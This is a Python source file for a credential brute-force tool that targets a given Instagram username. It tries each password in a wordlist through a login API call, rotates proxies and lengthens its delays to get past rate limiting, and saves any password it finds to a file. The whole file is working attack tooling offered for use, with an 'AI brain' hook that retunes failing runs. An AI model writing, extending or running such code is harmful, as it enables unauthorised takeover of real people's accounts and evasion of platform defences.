#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Brute force with live progress — n/total, %, bar, speed, ETA, current password."""
import os
import sys
import json
import time
import random

try:
    from .banner import info, ok, warn, err, ai, C, progress_bar
    from .api import InstagramAPI
except ImportError:
    def info(m): print(f"[*] {m}")
    def ok(m):   print(f"[+] {m}")
    def warn(m): print(f"[!] {m}")
    def err(m):  print(f"[-] {m}")
    def ai(m):   print(f"[AI] {m}")
    class C: R=G=Y=C=M=W=E=""
    def progress_bar(c,t,p=""): return f"{p} {c}/{t}"
    from api import InstagramAPI


class BruteForce:
    GPU = "█"  # filled bar char

    def __init__(self, username, wordlist, output_dir="output",
                 proxy_manager=None, delays=(3, 5), ai_brain=None):
        self.username = username.strip().lstrip("@")
        self.wordlist = wordlist or []
        self.output_dir = output_dir
        self.proxy_manager = proxy_manager
        self.delays = delays
        self.ai_brain = ai_brain
        self.api = InstagramAPI()
        self.total = len(self.wordlist)
        self.tested = 0
        self.found = False
        self.running = True
        self.start_time = 0.0
        self.session_fails = 0
        self.consecutive_fails = 0
        self.results = {"attempts": [], "found": None, "errors": []}
        self._load_progress()

    def _progress_file(self):
        return os.path.join(self.output_dir, self.username, "progress.json")

    def _found_file(self):
        return os.path.join(self.output_dir, self.username, "found.txt")

    def _load_progress(self):
        pf = self._progress_file()
        if os.path.isfile(pf):
            try:
                with open(pf, "r", encoding="utf-8") as f:
                    self.results = json.load(f)
                old_tested = len(self.results.get("attempts", []))
                if old_tested > 0:
                    info(f"Resuming from {old_tested}/{self.total}")
                    self.wordlist = self.wordlist[old_tested:]
            except Exception:
                pass

    def _save_progress(self):
        os.makedirs(os.path.dirname(self._progress_file()), exist_ok=True)
        with open(self._progress_file(), "w", encoding="utf-8") as f:
            json.dump(self.results, f, indent=2, ensure_ascii=False)

    def _save_found(self, password):
        with open(self._found_file(), "w", encoding="utf-8") as f:
            f.write(f"username: {self.username}\npassword: {password}\n")
        ok(f"SAVED → {self._found_file()}")

    # ── MAIN LOOP ──

    def run(self):
        if not self.wordlist:
            err("Empty wordlist!")
            return None

        self.start_time = time.time()
        self.running = True
        self.found = False

        print()
        info(f"Starting brute force — {self.total} passwords")
        info(f"Target: @{self.username}")
        info(f"Delay: {self.delays[0]}-{self.delays[1]}s")
        print()

        last_save_time = time.time()

        for i, password in enumerate(self.wordlist):
            if not self.running:
                warn("Stopped by user")
                break

            self.tested = i + 1
            current_proxy = None

            try:
                # Get proxy
                if self.proxy_manager:
                    current_proxy = self.proxy_manager.get_next()
                    self.api.set_proxy(current_proxy)

                # Try login
                result = self.api.try_login(self.username, password)

                # Record
                entry = {
                    "index": i,
                    "password": password,
                    "status": result.get("status", "unknown"),
                    "time": time.time() - self.start_time,
                }
                self.results["attempts"].append(entry)

                # Handle result
                self._handle_result(result, password, current_proxy)

                # Save progress
                if time.time() - last_save_time > 5:
                    self._save_progress()
                    last_save_time = time.time()

                # AI brain feedback
                if self.ai_brain:
                    self.ai_brain.record_attempt(password, result)

                # Live output
                self._live_display(i, password, result)

                if self.found:
                    break

                # Delay
                d = random.uniform(self.delays[0], self.delays[1])
                if result.get("status") == "rate_limited":
                    d += random.uniform(30, 60)
                    warn("Rate limited — longer delay...")
                time.sleep(d)

            except KeyboardInterrupt:
                print()
                warn("Interrupted — progress saved")
                self._save_progress()
                self.running = False
                break
            except Exception as e:
                err(f"Unexpected error: {e}")
                if current_proxy and self.proxy_manager:
                    self.proxy_manager.mark_dead(current_proxy)
                self.results["errors"].append({"index": i, "password": password, "error": str(e)})

        self._save_progress()

        if self.found:
            total_time = time.time() - self.start_time
            m, s = divmod(int(total_time), 60)
            print(f"\n{C.G}{'='*50}{C.E}")
            print(f"{C.G}  PASSWORD FOUND!{C.E}")
            print(f"{C.G}  Username : @{self.username}{C.E}")
            print(f"{C.G}  Password : {self.results.get('found',{}).get('password','?')}{C.E}")
            print(f"{C.G}  Time     : {m}m {s}s{C.E}")
            print(f"{C.G}  Attempts : {self.tested}{C.E}")
            print(f"{C.G}{'='*50}{C.E}")
            return self.results["found"]
        else:
            err(f"Not found — {self.tested} passwords tested")
            return None

    def _handle_result(self, result, password, proxy_url):
        status = result.get("status", "unknown")

        if status == "ok" or result.get("success") is True:
            self.found = True
            self.running = False
            self.results["found"] = {"password": password, "raw": result}
            self._save_found(password)
            if self.proxy_manager:
                self.proxy_manager.mark_alive(proxy_url)
            return

        if status == "bad_password":
            self.consecutive_fails = 0
            if self.proxy_manager:
                self.proxy_manager.mark_alive(proxy_url)

        elif status == "proxy_error":
            if self.proxy_manager:
                self.proxy_manager.mark_dead(proxy_url)
            self.session_fails += 1
            self.consecutive_fails += 1

        elif status in ("timeout", "connection_error"):
            self.session_fails += 1
            self.consecutive_fails += 1
            if self.proxy_manager and proxy_url:
                self.proxy_manager.mark_dead(proxy_url)

        elif status == "rate_limited":
            if self.proxy_manager and proxy_url:
                self.proxy_manager.mark_dead(proxy_url)
            self.session_fails += 1
            self.consecutive_fails += 1

        elif status == "checkpoint":
            self.consecutive_fails = 0
            warn(f"Account has checkpoint: @{self.username}")
            if self.proxy_manager:
                self.proxy_manager.mark_alive(proxy_url)

        elif status == "invalid_user":
            err(f"User @{self.username} does not exist!")
            self.running = False

        # AI heals
        if self.ai_brain and self.consecutive_fails >= 3:
            self.ai_brain.heal(self)

    def _live_display(self, i, password, result):
        elapsed = time.time() - self.start_time
        pct = (i + 1) / self.total * 100

        # Speed
        speed = (i + 1) / max(elapsed, 0.1)
        speed_str = f"{speed:.1f}/s" if speed < 60 else f"{speed/60:.1f}/m"

        # ETA
        eta = (self.total - i - 1) / max(speed, 0.01)
        if eta < 120:
            eta_str = f"{int(eta)}s"
        elif eta < 7200:
            eta_str = f"{eta/60:.1f}m"
        else:
            eta_str = f"{eta/3600:.1f}h"

        # Bar
        bw = 30
        filled = int(bw * (i + 1) / self.total)
        bar = f"{C.G}{self.GPU * filled}{C.D}{self.GPU * (bw - filled)}{C.E}"

        # Status icon
        st = result.get("status", "?")
        if st == "bad_password":
            icon = f"{C.R}✗{C.E}"
        elif st == "ok" or result.get("success"):
            icon = f"{C.G}✓ FOUND!{C.E}"
        elif st in ("proxy_error", "timeout"):
            icon = f"{C.Y}↻{C.E}"
        elif st == "rate_limited":
            icon = f"{C.Y}⏱{C.E}"
        else:
            icon = f"{C.Y}?{C.E}"

        pw_display = password[:24] + ".." if len(password) > 26 else password

        sys.stdout.write(
            f"\r  {icon} [{bar}] {pct:5.1f}% | "
            f"{i+1}/{self.total} | {speed_str} | ETA {eta_str} | "
            f"{pw_display:<28} "
        )
        sys.stdout.flush()

        if self.found or st in ("invalid_user", "checkpoint"):
            print()

    def stop(self):
        self.running = False
        self._save_progress()
